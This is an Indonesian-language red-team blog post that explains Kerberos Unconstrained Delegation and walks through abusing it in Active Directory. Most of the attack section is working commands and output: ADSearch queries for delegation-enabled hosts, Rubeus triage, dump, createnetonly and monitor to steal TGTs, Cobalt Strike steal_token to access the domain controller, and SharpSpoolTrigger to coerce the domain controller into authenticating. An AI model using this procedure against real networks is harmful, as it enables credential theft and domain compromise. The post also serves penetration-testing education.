---
title: '[Kerberos] Unconstrained Delegation'
date: 2023-08-01 22:43:22 +0700
categories: ['Active Directory', 'Post Compromise Attack']
tags: [red team, active directory hacking, windows hacking, post compromise attack, kerberos]     # TAG names should always be lowercase
author: nairpaa
---

**Unconstrained Delegation** adalah suatu fitur dalam Kerberos dan Active Directory yang memungkinkan suatu *service* atau mesin untuk beroperasi atas nama pengguna lain ketika berinteraksi dengan *service* lain.

![Konfigurasi Unconstained Delegation](/assets/img/posts/kerberos-unconstrained-delegation/1.png)
_Konfigurasi Unconstained Delegation_

Fitur ini pertama kali diperkenalkan pada Windows 2000 untuk menyelesaikan masalah seperti aplikasi *front-end* yang perlu otentikasi ke database *back-end* sebagai pengguna yang terautentikasi.

Berikut adalah contoh cara kerja *Unconstrained Delegation*:
1. Pengguna melakukan otentikasi Kerberos ke Web Server.
2. Web Server, yang dikonfigurasi dengan *Unconstrained Delegation*, mengekstrak TGT pengguna dari TGS dan menyimpannya dalam memori.
3. Ketika Web Server perlu mengakses DB Server atas nama pengguna, ia menggunakan TGT pengguna untuk meminta TGS untuk *service* database.

*Unconstrained Delegation* memiliki risiko keamanan karena jika suatu mesin dengan *Unconstrained Delegation* di-*compromised*, TGT yang disimpan dalam memori dapat diekstraksi dan digunakan untuk meniru pengguna terhadap *service* lain dalam domain. 

Oleh karena itu, penting untuk hati-hati ketika mengonfigurasi *Unconstrained Delegation* dan memantau kegiatan yang mencurigakan.

Dalam konteks serangan, jika seorang penyerang dapat meng-*compromised* mesin dengan *Unconstrained Delegation* (misalnya, `WEB$`), mereka dapat mengekstraksi TGT yang disimpan dalam memori dan menggunakan mereka untuk meniru pengguna.

## 0x1 - Exploitation Stages

### Method 1

#### Step 1: Find All Computers Permitted for Unconstrained Delegation

```powershell
PS > .\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

[*] TOTAL NUMBER OF SEARCH RESULTS: 2
	[+] samaccountname : DC$
	[+] dnshostname    : dc.example.io
	
	[+] samaccountname : WEB$
	[+] dnshostname    : web.dev.example.io
```

> Domain Controller selalu diizinkan untuk pendelegasian *Unconstrained Delegation*.
{: .prompt-info }

#### Step 2: Show All the Tickets That Are Currently Cached

```powershell
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

PS > .\Rubeus.exe triage

 --------------------------------------------------------------------------------------------------------------- 
 | LUID     | UserName                  | Service                                       | EndTime              |
 --------------------------------------------------------------------------------------------------------------- 
 | 0x147abc | namina @ DEV.EXAMPLE.IO | krbtgt/DEV.EXAMPLE.IO                      | 10/7/2023 9:35:38 PM |
```

#### Step 3: Extract the TGT and Leverage It via a New Logon Session

```powershell
PS > .\Rubeus.exe dump /luid:0x147abc /nowrap

PS > .\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:namina /password:FakePass /ticket:doIFwj[...]MuSU8=

[*] Using DEV\namina:FakePass

[*] Showing process : False
[*] Username        : namina
[*] Domain          : DEV
[*] Password        : FakePass
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 1540
[+] Ticket successfully imported!
[+] LUID            : 0x3206fb
```

```powershell
beacon> steal_token 1540

beacon> ls \\dc.example.io\c$
```

### Method 2

#### Step 1: Monitor and Extract new TGT

Kita juga dapat memperoleh TGT untuk akun komputer dengan memaksanya untuk mengautentikasi dari jarak jauh ke mesin ini.  

Seperti yang disebutkan dalam modul [NTLM Relaying](/posts/smb-relay/), ada beberapa *tools* yang tersedia untuk memfasilitasi hal ini.  

Kali ini, kita akan memaksa Domain Controller untuk mengautentikasi ke server web untuk mencuri TGT-nya.

Kita akan menggunakan perintah `monitor` dari Rubeus.  Perintah ini akan terus memantau dan mengekstrak TGT baru didapatkan.  

Ini adalah strategi yang lebih baik jika dibandingkan dengan menjalankan `triage` secara manual karena terdapat kemungkinan kita tidak melihat atau melewatkan suatu tiket.

```powershell
PS > .\Rubeus.exe monitor /interval:10 /nowrap
```

> Untuk menghentikan monitor Rubeus, gunakan perintah `job` dan `jobkill`.
{: .prompt-info }

#### Step 2: Trigger and Capture the Ticket

Selanjutnya, jalankan [SharpSpoolTrigger](https://github.com/cube0x0/SharpSystemTriggers/tree/main/SharpSpoolTrigger).

```powershell
PS > .\SharpSpoolTrigger.exe dc.example.io web.dev.example.io
```

Keterangan:
- `dc.example.io` adalah target.
- `web.dev.example.io` adalah *listener*.

Rubeus akan menangkap tiket, seperti berikut:

```bash
[*] 9/6/2022 2:44:52 PM UTC - Found new TGT:

  User                  :  DC$@DEV.CYBERBOTIC.IO
  StartTime             :  5/6/2023 9:06:14 AM
  EndTime               :  5/6/2023 7:06:14 PM
  RenewTill             :  5/13/2023 9:06:14 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

doIFuj[...]lDLklP
```

> TGT mesin/komputer bisa dimanfaatkan dengan cara yang sedikit berbeda, lihat materi [S4U2Self Abuse](/posts/s4u2self-abuse).  
{: .prompt-tip }

> Perlu dicatat bahwa Anda perlu memiliki akses ke layanan spooler pada target untuk menjalankan perintah `SharpSpoolTrigger` ini, yang biasanya memerlukan hak administratif atau setidaknya hak kontrol spooler.
>
> Untuk mengecek apakah Anda memiliki akses ke layanan spooler pada sistem tertentu, Anda dapat menggunakan perintah berikut di baris perintah Windows:
> 
> ```powershell
> C:\> sc \\<target_system> qc spooler
> ```
{: .prompt-warning }

---

## 0x2 - References

- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/unconstrained-delegation
- https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976
- https://pentestlab.blog/2022/03/21/unconstrained-delegation/
- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
- https://github.com/cube0x0/SharpSystemTriggers

